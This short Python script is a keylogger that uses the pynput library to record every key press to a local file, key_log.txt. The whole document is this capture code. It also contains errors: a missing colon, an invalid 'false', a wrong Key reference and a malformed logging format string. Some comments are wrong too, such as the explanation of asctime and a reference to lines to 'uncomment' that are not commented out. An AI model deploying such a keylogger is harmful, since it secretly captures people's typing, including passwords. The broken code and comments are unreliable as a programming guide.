#from github
from pynput.keyboard import Key, Listener
#vanilla python library
import logging

#make a log file
log_dir = ""
#filename we want to log to. Name of file is key_log.txt
#format is -> asctime => time will be in ascending order ie latest messages first
logging.basicConfig(filename=(log_dir + 'key_log.txt'), level = logging.DEBUG, format='%(asctime)a:%(message)s:')

#logging on_press function 
#instead of logging message we want to log key
def on_press(key):
	logging.info(str(key)) 
	if key == key.esc
		return false
	#uncomment the above lines if you want the logger to run in the background even if you press esc

with Listener(on_press = on_press) as listener:
	listener.join()
